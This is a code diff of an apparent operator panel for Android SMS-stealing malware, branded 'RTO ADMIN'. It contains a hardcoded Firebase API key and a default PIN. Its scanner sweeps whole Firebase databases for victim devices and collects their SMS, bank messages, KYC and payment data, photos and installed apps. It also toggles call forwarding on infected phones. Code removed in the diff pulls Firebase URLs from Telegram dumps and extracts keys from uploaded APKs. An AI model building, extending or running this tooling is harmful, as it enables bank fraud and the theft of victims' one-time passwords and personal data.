@@ -10,8 +10,6 @@
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; color:#E5E7EB; min-height:100vh; }
-
-/* LOGIN */
 .login-screen { position:fixed; inset:0; background:#050810; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; overflow-y:auto; }
 .login-box { background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; padding:28px; max-width:420px; width:100%; text-align:center; }
 .login-box h1 { color:#60A5FA; font-size:22px; margin-bottom:6px; }
@@ -25,17 +23,14 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .acc-sep::before, .acc-sep::after { content:''; flex:1; height:1px; background:#1E3A8A; }
 .acc-list { text-align:left; max-height:220px; overflow-y:auto; margin-bottom:6px; }
 .acc-item { background:#050810; border:1px solid #1E3A8A; border-radius:10px; padding:11px 12px; margin-bottom:8px; display:flex; align-items:center; gap:10px; cursor:pointer; }
-.acc-item:active { border-color:#3B82F6; background:#0F1E3D; }
 .acc-icon { width:34px; height:34px; border-radius:9px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
 .acc-info { flex:1; min-width:0; }
 .acc-name { color:#FFF; font-size:12px; font-weight:600; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .acc-url { color:#64748B; font-size:9px; font-family:monospace; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .acc-del { background:rgba(239,68,68,0.15); border:none; color:#F87171; width:26px; height:26px; border-radius:6px; cursor:pointer; font-size:12px; }
 .new-form { text-align:left; }
-.new-form h3 { color:#60A5FA; font-size:14px; margin-bottom:14px; text-align:center; }
 .new-form .fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
 .new-form .fi { width:100%; padding:11px 12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; margin-bottom:10px; }
-.new-form .fi:focus { outline:none; border-color:#3B82F6; }
 .btn-row { display:flex; gap:8px; margin-top:8px; }
 .btn-row button { flex:1; padding:12px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; }
 .btn-row .save { background:#3B82F6; color:white; }
@@ -44,13 +39,11 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .new-acc-full h2 { color:#FFF; font-size:16px; margin-bottom:4px; text-align:left; }
 .new-acc-full .hint2 { color:#64748B; font-size:10px; margin-bottom:16px; text-align:left; }
 .bulk-card { background:linear-gradient(135deg, rgba(59,130,246,0.08), rgba(168,85,247,0.05)); border:1px solid rgba(59,130,246,0.3); border-radius:12px; padding:14px; margin-bottom:14px; text-align:left; }
-.bulk-card h3 { color:#F59E0B; font-size:13px; margin-bottom:6px; display:flex; align-items:center; gap:6px; }
+.bulk-card h3 { color:#F59E0B; font-size:13px; margin-bottom:6px; }
 .bulk-card p { color:#94A3B8; font-size:10px; line-height:1.55; margin-bottom:10px; }
 .bulk-card textarea { width:100%; min-height:100px; padding:11px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:11px; font-family:monospace; resize:vertical; line-height:1.5; }
-.bulk-card textarea:focus { outline:none; border-color:#3B82F6; }
-.btn-bulk { width:100%; padding:13px; background:linear-gradient(135deg,#06B6D4,#3B82F6); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:10px; display:flex; align-items:center; justify-content:center; gap:8px; }
+.btn-bulk { width:100%; padding:13px; background:linear-gradient(135deg,#06B6D4,#3B82F6); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:10px; }
 .apk-upload { background:rgba(59,130,246,0.03); border:2px dashed rgba(59,130,246,0.3); border-radius:12px; padding:22px 16px; text-align:center; margin-bottom:14px; cursor:pointer; }
-.apk-upload:active { background:rgba(59,130,246,0.08); border-color:#3B82F6; }
 .apk-upload .up-ico { width:50px; height:50px; margin:0 auto 12px; background:#0A1428; border:1px solid #1E3A8A; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:22px; color:#60A5FA; }
 .apk-upload h4 { color:#E5E7EB; font-size:13px; margin-bottom:4px; }
 .apk-upload p { color:#64748B; font-size:10px; }
@@ -120,7 +113,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
 .fi, .fs, .ft { width:100%; padding:11px 12px; background:#0A1428; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; }
 .ft { min-height:80px; resize:vertical; }
-.fi:focus, .ft:focus, .fs:focus { outline:none; border-color:#3B82F6; }
 .btn { width:100%; padding:12px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-top:6px; }
 .btn.green { background:#10B981; }
 .btn.dark { background:#1E3A8A; color:#60A5FA; }
@@ -198,16 +190,15 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .cf-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:3000; display:none; align-items:center; justify-content:center; padding:20px; }
 .cf-overlay.active { display:flex; }
 .cf-dialog { background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:400px; width:100%; }
-.cf-dialog h3 { color:#60A5FA; font-size:15px; margin-bottom:6px; display:flex; align-items:center; gap:8px; }
+.cf-dialog h3 { color:#60A5FA; font-size:15px; margin-bottom:6px; }
 .cf-dialog .cf-hint { color:#64748B; font-size:11px; margin-bottom:16px; line-height:1.5; }
 .cf-dialog .cf-label { display:block; color:#64748B; font-size:10px; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
-.cf-dialog .cf-input { width:100%; padding:12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:14px; font-family:monospace; margin-bottom:14px; letter-spacing:0.05em; }
-.cf-dialog .cf-input:focus { outline:none; border-color:#3B82F6; }
+.cf-dialog .cf-input { width:100%; padding:12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:14px; font-family:monospace; margin-bottom:14px; }
 .cf-sim-row { display:flex; gap:8px; margin-bottom:16px; }
 .cf-sim-btn { flex:1; padding:12px; background:#050810; border:2px solid #1E3A8A; border-radius:8px; color:#64748B; font-size:12px; font-weight:bold; cursor:pointer; text-align:center; }
 .cf-sim-btn.active { background:#3B82F6; color:white; border-color:#3B82F6; }
 .cf-actions { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:10px; }
-.cf-btn { padding:12px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px; }
+.cf-btn { padding:12px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; }
 .cf-btn.activate { background:#10B981; color:white; }
 .cf-btn.deactivate { background:#EF4444; color:white; }
 .cf-btn.check { background:#1E3A8A; color:#60A5FA; border:1px solid #3B82F6; grid-column:1 / -1; }
@@ -215,12 +206,9 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .cf-status.ok { background:rgba(16,185,129,0.08); border-color:rgba(16,185,129,0.3); color:#10B981; }
 .cf-status.err { background:rgba(239,68,68,0.08); border-color:rgba(239,68,68,0.3); color:#F87171; }
 .cf-close { width:100%; padding:11px; background:#1E3A8A; color:#60A5FA; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-top:6px; }
-
-/* SCAN STATUS */
 .scan-status { background:rgba(59,130,246,0.05); border:1px solid rgba(59,130,246,0.2); border-radius:8px; padding:10px; margin:0 16px 12px; font-size:10px; color:#60A5FA; display:flex; align-items:center; gap:8px; }
 .scan-status .spin { display:inline-block; width:12px; height:12px; border:2px solid rgba(59,130,246,0.3); border-top-color:#3B82F6; border-radius:50%; animation:spin 1s linear infinite; }
 @keyframes spin { to { transform:rotate(360deg); } }
-
 @media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .filters, .chips { padding:10px 12px; } .drawer { max-width:100%; } .pitem img { height:90px; } }
 </style>
 </head>
@@ -230,7 +218,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   <div class="login-box" id="loginBox">
     <h1>🔐 RTO ADMIN</h1>
     <p>Enter PIN or add account</p>
-    
     <div id="pinView">
       <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
       <button class="btn-primary" id="loginBtn">LOGIN WITH PIN</button>
@@ -239,7 +226,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
       <div class="acc-list" id="accList"></div>
       <button class="btn-secondary" id="btnNewAcc">+ New Account</button>
     </div>
-    
     <div id="newAccView" style="display:none;">
       <div class="new-acc-full" style="text-align:left;">
         <button class="back-btn2" id="btnCancelNew">← Back</button>
@@ -247,14 +233,14 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
         <div class="hint2">Add Firebase URL, API Key, or upload APK</div>
         <div class="bulk-card">
           <h3>⚡ Bulk Connect</h3>
-          <p>Kahi se bhi firebase URLs paste karo — Telegram dump ho, list ho, kuch bhi. Har firebase URL AUTO-detect hoga, saath likhi hui "Auth Key" / 🔑 / Alza... key bhi apne-aap uth jayegi. Duplicate URL sirf ek baar connect hota hai. Bina key ke bhi URL connect hota hai.</p>
-          <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy...&#10;&#10;📍 Firebase URL: https://app-two-default-rtdb.firebaseio.com"></textarea>
+          <p>Kahi se bhi firebase URLs paste karo — Telegram dump ho, list ho, kuch bhi. Har firebase URL AUTO-detect hoga.</p>
+          <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy..."></textarea>
           <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
         </div>
         <div class="apk-upload" id="apkUpload">
           <div class="up-ico">⬆</div>
           <h4>Upload APK File</h4>
-          <p>Auto-extracts Firebase URL & API Key (Full deep scan)</p>
+          <p>Auto-extracts Firebase URL & API Key</p>
           <div class="apk-status" id="apkStatus"></div>
           <input type="file" id="apkFile" accept=".apk,.zip">
         </div>
@@ -356,13 +342,12 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
       <button class="cf-btn deactivate" id="cfDeactivate">■ DEACTIVATE</button>
       <button class="cf-btn check" id="cfCheck">🔍 CHECK STATUS</button>
     </div>
-    <div class="cf-status" id="cfStatus">Ready. Enter number or click Check Status.</div>
+    <div class="cf-status" id="cfStatus">Ready.</div>
     <button class="cf-close" id="cfClose">✕ CLOSE</button>
   </div>
 </div>
 
 <script>
-// ═══ CONFIG ═══
 var RTO_CONFIG = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
   databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
@@ -374,6 +359,7 @@ var db = null;
 var currentApp = null;
 var currentAccount = null;
 var devs = {};
+var devPaths = {};         // deviceId -> { messages: path, photos: path, ... }
 var curId = null;
 var curTab = 'info';
 var curMsgs = {};
@@ -381,49 +367,25 @@ var curFilter = 'all';
 var liked = JSON.parse(localStorage.getItem('liked') || '[]');
 var photos = {};
 var curPhoto = '';
-var deviceListener = null;
 var scanListener = null;
+var dataListeners = [];    // Universal data listeners
 var cfSimSlot = 1;
 
 // ═══ SAVED ACCOUNTS ═══
-function getSavedAccounts() {
-  try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); }
-  catch(e) { return []; }
-}
+function getSavedAccounts() { try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); } catch(e) { return []; } }
 function saveAccounts(list) { localStorage.setItem('rto_accounts', JSON.stringify(list)); }
 function renderAccounts() {
   var list = getSavedAccounts();
   var el = document.getElementById('accList');
-  if (list.length === 0) {
-    el.innerHTML = '<div style="text-align:center;color:#475569;font-size:11px;padding:10px 0;">No saved accounts</div>';
-    return;
-  }
+  if (list.length === 0) { el.innerHTML = '<div style="text-align:center;color:#475569;font-size:11px;padding:10px 0;">No saved accounts</div>'; return; }
   el.innerHTML = list.map(function(a, i) {
-    return '<div class="acc-item" data-acc="' + i + '">' +
-      '<div class="acc-icon">🔥</div>' +
-      '<div class="acc-info">' +
-        '<div class="acc-name">' + esc(a.name || 'Account ' + (i+1)) + '</div>' +
-        '<div class="acc-url">' + esc((a.url || '').replace('https://', '').replace('.firebaseio.com', '')) + '</div>' +
-      '</div>' +
-      '<button class="acc-del" data-del="' + i + '">✕</button>' +
-    '</div>';
+    return '<div class="acc-item" data-acc="' + i + '"><div class="acc-icon">🔥</div><div class="acc-info"><div class="acc-name">' + esc(a.name || 'Account ' + (i+1)) + '</div><div class="acc-url">' + esc((a.url || '').replace('https://', '').replace('.firebaseio.com', '')) + '</div></div><button class="acc-del" data-del="' + i + '">✕</button></div>';
   }).join('');
   el.querySelectorAll('.acc-item').forEach(function(item) {
-    item.addEventListener('click', function(e) {
-      if (e.target.hasAttribute('data-del')) return;
-      openAccount(parseInt(this.getAttribute('data-acc')));
-    });
+    item.addEventListener('click', function(e) { if (e.target.hasAttribute('data-del')) return; openAccount(parseInt(this.getAttribute('data-acc'))); });
   });
   el.querySelectorAll('[data-del]').forEach(function(b) {
-    b.addEventListener('click', function(e) {
-      e.stopPropagation();
-      var idx = parseInt(this.getAttribute('data-del'));
-      if (!confirm('Delete this account?')) return;
-      var list = getSavedAccounts();
-      list.splice(idx, 1);
-      saveAccounts(list);
-      renderAccounts();
-    });
+    b.addEventListener('click', function(e) { e.stopPropagation(); var idx = parseInt(this.getAttribute('data-del')); if (!confirm('Delete?')) return; var list = getSavedAccounts(); list.splice(idx, 1); saveAccounts(list); renderAccounts(); });
   });
 }
 
@@ -435,30 +397,14 @@ function doLogin() {
   var tempApp = firebase.initializeApp(RTO_CONFIG, 'temp_' + Date.now());
   var tempDb = tempApp.database();
   tempDb.ref('admin_config/login_pin').once('value').then(function(s) {
-    if (p === (s.val() || '0987')) {
-      tempApp.delete();
-      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey };
-      openPanel(RTO_CONFIG, 'RTO Admin');
-    } else {
-      tempApp.delete();
-      document.getElementById('errorMsg').textContent = '❌ Wrong PIN';
-    }
-  }).catch(function(e) {
-    tempApp.delete();
-    document.getElementById('errorMsg').textContent = 'Error: ' + e.message;
-  });
+    if (p === (s.val() || '0987')) { tempApp.delete(); currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey }; openPanel(RTO_CONFIG, 'RTO Admin'); }
+    else { tempApp.delete(); document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
+  }).catch(function(e) { tempApp.delete(); document.getElementById('errorMsg').textContent = 'Error: ' + e.message; });
 }
 function openAccount(idx) {
-  var list = getSavedAccounts();
-  var acc = list[idx];
-  if (!acc) return;
+  var list = getSavedAccounts(); var acc = list[idx]; if (!acc) return;
   currentAccount = acc;
-  var cfg = {
-    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
-    databaseURL: acc.url,
-    projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
-  };
-  openPanel(cfg, acc.name || 'Account ' + (idx+1));
+  openPanel({ apiKey: acc.apiKey || RTO_CONFIG.apiKey, databaseURL: acc.url, projectId: acc.url.replace('https://','').replace('.firebaseio.com','') }, acc.name || 'Account');
 }
 function openPanel(config, title) {
   try {
@@ -473,7 +419,7 @@ function openPanel(config, title) {
 }
 function doLogout() {
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
-  db = null; devs = {}; curId = null;
+  db = null; devs = {}; devPaths = {}; curId = null;
   document.getElementById('mainApp').style.display = 'none';
   document.getElementById('loginScreen').style.display = 'flex';
   document.getElementById('pinInput').value = '';
@@ -485,11 +431,8 @@ function doLogout() {
 
 // ═══════════════════════════════════════════════════════
 // ⭐ UNIVERSAL DEVICE SCANNER ⭐
-// Firebase mein kahin bhi device ho — dhundh lega
 // ═══════════════════════════════════════════════════════
 function startApp() {
-  // Purane listeners hatao
-  if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   
   var scanEl = document.getElementById('scanStatus');
@@ -497,47 +440,43 @@ function startApp() {
   scanEl.style.display = 'flex';
   scanText.textContent = 'Scanning Firebase for devices...';
   
-  devs = {};
+  devs = {}; devPaths = {};
   
-  // ✅ Poora Firebase root scan karo
   scanListener = db.ref('/');
   scanListener.on('value', function(snapshot) {
     var root = snapshot.val() || {};
-    devs = {};
+    devs = {}; devPaths = {};
     var found = 0;
     
-    // ✅ Har top-level node scan karo
+    var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
+    
     Object.keys(root).forEach(function(nodeName) {
+      if (skipNodes.indexOf(nodeName) !== -1) return;
       var node = root[nodeName];
       if (!node || typeof node !== 'object') return;
       
-      // Skip known non-device nodes
-      var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
-      if (skipNodes.indexOf(nodeName) !== -1) return;
-      
-      // ✅ Har entry check karo (DEV_XXX ya koi bhi)
       Object.keys(node).forEach(function(key) {
         var entry = node[key];
         if (!entry || typeof entry !== 'object') return;
         
-        // ✅ Device hai ya nahi? Heuristic check
         if (isDeviceEntry(key, entry)) {
-          // Agar same device multiple nodes mein hai, merge karo
-          if (devs[key]) {
-            devs[key] = Object.assign({}, devs[key], entry);
-          } else {
+          if (!devs[key]) {
             devs[key] = entry;
+            devPaths[key] = { device: nodeName + '/' + key };  // ✅ Base path
             found++;
+          } else {
+            // Merge device fields
+            Object.keys(entry).forEach(function(k) {
+              if (devs[key][k] === undefined) devs[key][k] = entry[k];
+            });
           }
         }
       });
     });
     
-    console.log('Devices found:', found, devs);
+    console.log('Devices found:', found);
     scanText.textContent = 'Found ' + found + ' device(s)';
-    setTimeout(function() {
-      scanEl.style.display = 'none';
-    }, 1500);
+    setTimeout(function() { scanEl.style.display = 'none'; }, 1500);
     
     updStats();
     renderDevs();
@@ -548,267 +487,147 @@ function startApp() {
   });
 }
 
-// ✅ Device entry detect karo — multiple signals
+// ✅ Device entry detect karo
 function isDeviceEntry(key, entry) {
-  // ✅ DEV_ prefix wali key = definitely device
   if (key.indexOf('DEV_') === 0) return true;
-  
-  // ✅ Known device fields check karo
-  var deviceFields = [
-    'device_model', 'device_id', 'device_manufacturer', 'device_brand',
-    'android_version', 'android_sdk', 'sim_info', 'battery',
-    'first_install_timestamp', 'install_timestamp', 'device_hardware',
-    'device_fingerprint', 'status', 'last_seen', 'messages',
-    'form_data', 'kyc_data', 'payment_data'
-  ];
-  
+  var deviceFields = ['device_model', 'device_id', 'device_manufacturer', 'device_brand', 'android_version', 'android_sdk', 'sim_info', 'battery', 'first_install_timestamp', 'install_timestamp', 'device_hardware', 'device_fingerprint', 'status', 'last_seen', 'messages', 'form_data', 'kyc_data', 'payment_data'];
   var matches = 0;
-  for (var i = 0; i < deviceFields.length; i++) {
-    if (entry[deviceFields[i]] !== undefined) matches++;
-  }
-  
-  // ✅ 2+ device fields match hue toh device hai
+  for (var i = 0; i < deviceFields.length; i++) { if (entry[deviceFields[i]] !== undefined) matches++; }
   return matches >= 2;
 }
 
-// ═══ NEW ACCOUNT ═══
-function showNewAcc() {
-  document.getElementById('pinView').style.display = 'none';
-  document.getElementById('newAccView').style.display = 'block';
-  document.getElementById('newErr').textContent = '';
-  document.getElementById('bulkInput').value = '';
-  document.getElementById('newUrl').value = '';
-  document.getElementById('newKey').value = '';
-  document.getElementById('apkStatus').classList.remove('show');
+// ═══════════════════════════════════════════════════════
+// ⭐ UNIVERSAL DATA LOADER ⭐
+// Device ka saara data dhundho — messages, sim, photos
+// ═══════════════════════════════════════════════════════
+function loadAllDeviceData(deviceId, callback) {
+  // Saare listeners clear karo
+  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
+  dataListeners = [];
+  
+  var data = {
+    messages: {},
+    sms_history: {},
+    photos: {},
+    notifications: {},
+    installed_apps: {},
+    sim_info: null,
+    forward_settings: null,
+    device_info: null
+  };
+  
+  // ✅ Firebase ka poora root scan karo
+  var listener = db.ref('/');
+  var cb = listener.on('value', function(snapshot) {
+    var root = snapshot.val() || {};
+    var merged = { messages: {}, sms_history: {}, photos: {}, notifications: {}, installed_apps: {}, sim_info: null, forward_settings: null, device_info: null };
+    
+    // ✅ Har node mein deviceId dhundho
+    scanForDevice(root, [], deviceId, merged);
+    
+    // Data update karo
+    Object.keys(merged).forEach(function(k) { data[k] = merged[k]; });
+    
+    // Callback
+    callback(data);
+  });
+  dataListeners.push({ ref: listener, cb: cb });
 }
-function hideNewAcc() {
-  document.getElementById('pinView').style.display = 'block';
-  document.getElementById('newAccView').style.display = 'none';
-}
-function parseBulkInput(text) {
-  var accounts = [];
-  var seenUrls = {};
-  var urlRegex = /https?:\/\/[a-zA-Z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g;
-  var keyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
-  var urls = text.match(urlRegex) || [];
-  var keys = text.match(keyRegex) || [];
-  for (var i = 0; i < urls.length; i++) {
-    var url = urls[i].trim();
-    if (seenUrls[url]) continue;
-    seenUrls[url] = true;
-    accounts.push({
-      url: url,
-      apiKey: keys[i] || keys[0] || RTO_CONFIG.apiKey,
-      name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','')
-    });
+
+// ✅ Recursively deviceId dhundho har node mein
+function scanForDevice(obj, path, deviceId, result) {
+  if (!obj || typeof obj !== 'object') return;
+  
+  // Agar ye object deviceId ki key hai → iske andar ka data collect karo
+  if (obj[deviceId] && typeof obj[deviceId] === 'object') {
+    collectData(obj[deviceId], result);
   }
-  return accounts;
-}
-function bulkConnect() {
-  var text = document.getElementById('bulkInput').value.trim();
-  if (!text) { document.getElementById('newErr').textContent = 'Paste some URLs first'; return; }
-  var accounts = parseBulkInput(text);
-  if (accounts.length === 0) { document.getElementById('newErr').textContent = 'No valid Firebase URL found'; return; }
-  document.getElementById('newErr').textContent = 'Found ' + accounts.length + ' URLs. Connecting...';
-  var list = getSavedAccounts();
-  var added = 0;
-  accounts.forEach(function(acc) {
-    var dup = list.findIndex(function(a) { return a.url === acc.url; });
-    if (dup === -1) {
-      list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey });
-      added++;
+  
+  // ✅ Deep scan — har child mein
+  Object.keys(obj).forEach(function(key) {
+    if (key === deviceId) return;
+    var child = obj[key];
+    if (child && typeof child === 'object') {
+      scanForDevice(child, path.concat([key]), deviceId, result);
     }
   });
-  saveAccounts(list);
-  document.getElementById('newErr').textContent = '✅ Added ' + added + ' account(s)';
-  renderAccounts();
-  setTimeout(function() { hideNewAcc(); renderAccounts(); }, 800);
 }
 
-// ═══ APK UPLOAD — FULL DEEP SCAN ═══
-function handleApkUpload(file) {
-  var status = document.getElementById('apkStatus');
-  status.classList.add('show');
-  status.textContent = '⏳ Reading APK (' + (file.size / 1024 / 1024).toFixed(1) + ' MB)...';
-  var reader = new FileReader();
-  reader.onload = function(e) {
-    try {
-      JSZip.loadAsync(e.target.result).then(function(zip) {
-        status.textContent = '📦 APK opened. Scanning all files...';
-        var foundUrls = [], foundKeys = [], scanned = 0, total = 0;
-        var files = [];
-        zip.forEach(function(path, file) { if (!file.dir) { files.push({path:path, file:file}); total++; } });
-        status.textContent = '📦 Found ' + total + ' files. Scanning...';
-        var promises = files.map(function(item) {
-          return item.file.async('uint8array').then(function(bytes) {
-            scanned++;
-            scanText(bytesToUtf8(bytes));
-            if (item.path.indexOf('.arsc') !== -1 || item.path.indexOf('.xml') !== -1 || item.path.indexOf('.dex') !== -1) {
-              scanText(bytesToUtf16(bytes, true));
-              scanText(bytesToUtf16(bytes, false));
-            }
-            if (item.path.indexOf('.dex') !== -1) scanText(extractDexStrings(bytes));
-            if (scanned % 10 === 0) status.textContent = '🔍 Scanned ' + scanned + '/' + total + ' files...';
-          }).catch(function() { scanned++; });
-        });
-        Promise.all(promises).then(function() {
-          var uUrls = dedup(foundUrls), uKeys = dedup(foundKeys);
-          console.log('Found URLs:', uUrls);
-          console.log('Found Keys:', uKeys);
-          if (uUrls.length > 0) {
-            var bestUrl = uUrls[0];
-            for (var i = 0; i < uUrls.length; i++) { if (uUrls[i].indexOf('firebaseio.com') !== -1 || uUrls[i].indexOf('firebasedatabase.app') !== -1) { bestUrl = uUrls[i]; break; } }
-            document.getElementById('newUrl').value = bestUrl;
-            status.textContent = '✅ Found ' + uUrls.length + ' URL(s): ' + bestUrl.substring(0, 50) + '...';
-          } else status.textContent = '⚠️ No Firebase URL found in this APK';
-          if (uKeys.length > 0) document.getElementById('newKey').value = uKeys[0];
-        });
-        function dedup(arr) { var out = [], seen = {}; arr.forEach(function(x) { if (!seen[x]) { seen[x] = true; out.push(x); } }); return out; }
-        function bytesToUtf8(bytes) { try { return new TextDecoder('utf-8', {fatal:false}).decode(bytes); } catch(e) { var s=''; for (var i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]); return s; } }
-        function bytesToUtf16(bytes, le) { try { return new TextDecoder(le?'utf-16le':'utf-16be', {fatal:false}).decode(bytes); } catch(e) { return ''; } }
-        function extractDexStrings(bytes) { var r='',c=''; for (var i=0;i<bytes.length;i++){var b=bytes[i]; if(b>=32&&b<=126)c+=String.fromCharCode(b); else{if(c.length>=4)r+=c+'\n';c='';}} if(c.length>=4)r+=c+'\n'; return r; }
-        function scanText(text) {
-          if (!text) return;
-          var patterns = [
-            /https?:\/\/[a-zA-Z0-9-]+-default-rtdb\.firebaseio\.com/g,
-            /https?:\/\/[a-zA-Z0-9-]+\.firebaseio\.com/g,
-            /https?:\/\/[a-zA-Z0-9-]+-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app/g,
-            /https?:\/\/[a-zA-Z0-9-]+\.[a-z0-9-]+\.firebasedatabase\.app/g,
-            /[a-zA-Z0-9-]+-default-rtdb\.firebaseio\.com/g,
-            /[a-zA-Z0-9-]+\.firebaseio\.com/g,
-            /[a-zA-Z0-9-]+-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app/g
-          ];
-          patterns.forEach(function(p) { var m = text.match(p); if (m) m.forEach(function(url) { if (url.indexOf('http') !== 0) url = 'https://' + url; if (url.indexOf('example.com') !== -1) return; if (url.length > 200) return; foundUrls.push(url); }); });
-          var km = text.match(/AIzaSy[A-Za-z0-9_-]{33}/g);
-          if (km) km.forEach(function(k) { foundKeys.push(k); });
-        }
-      }).catch(function(err) { status.textContent = '❌ Error: ' + err.message; });
-    } catch(err) { status.textContent = '❌ Error: ' + err.message; }
-  };
-  reader.readAsArrayBuffer(file);
-}
-
-function saveNewAcc() {
-  var url = document.getElementById('newUrl').value.trim();
-  var key = document.getElementById('newKey').value.trim();
-  var err = document.getElementById('newErr');
-  if (!url || url.indexOf('firebaseio') === -1) { err.textContent = '❌ Invalid Firebase URL'; return; }
-  if (!key) key = RTO_CONFIG.apiKey;
-  err.textContent = 'Testing connection...';
-  var testCfg = { apiKey: key, databaseURL: url, projectId: url.replace('https://','').replace('.firebaseio.com','') };
-  var list = getSavedAccounts();
-  var dup = list.findIndex(function(a) { return a.url === url; });
-  var acc = { name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb',''), url: url, apiKey: key };
-  if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; }
-  else list.push(acc);
-  saveAccounts(list);
-  err.textContent = '✅ Connected! Opening panel...';
-  setTimeout(function() { currentAccount = acc; hideNewAcc(); openPanel(testCfg, acc.name); }, 600);
-}
-
-// ═══ STATS / DEVICES ═══
-function updStats() {
-  var ids = Object.keys(devs);
-  var on = 0, off = 0, sms = 0, bank = 0;
-  ids.forEach(function(id) {
-    var d = devs[id];
-    if (d.status === 'Online') on++; else off++;
-    var allM = [];
-    if (d.messages) Object.values(d.messages).forEach(function(m) { allM.push(m); });
-    if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { allM.push(m); });
-    sms += allM.length;
-    allM.forEach(function(m) { var c = cat(m.sender, m.body); if (c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT') bank++; });
-  });
-  document.getElementById('sTotal').textContent = ids.length;
-  document.getElementById('sOnline').textContent = on;
-  document.getElementById('sOffline').textContent = off;
-  document.getElementById('sSms').textContent = sms;
-  document.getElementById('sBank').textContent = bank;
-}
-function isLiked(id) { return liked.indexOf(id) !== -1; }
-function toggleLike(id) {
-  if (isLiked(id)) liked = liked.filter(function(x) { return x !== id; });
-  else liked.push(id);
-  localStorage.setItem('liked', JSON.stringify(liked));
-  renderDevs(); updStar();
-}
-function updStar() { var b = document.getElementById('btnStar'); if (b) b.textContent = isLiked(curId) ? '⭐' : '☆'; }
-function renderDevs() {
-  var g = document.getElementById('deviceGrid');
-  var q = (document.getElementById('searchBox').value || '').toLowerCase();
-  var ids = Object.keys(devs).filter(function(id) {
-    var d = devs[id];
-    if (curFilter === 'online' && d.status !== 'Online') return false;
-    if (curFilter === 'offline' && d.status === 'Online') return false;
-    if (curFilter === 'liked' && !isLiked(id)) return false;
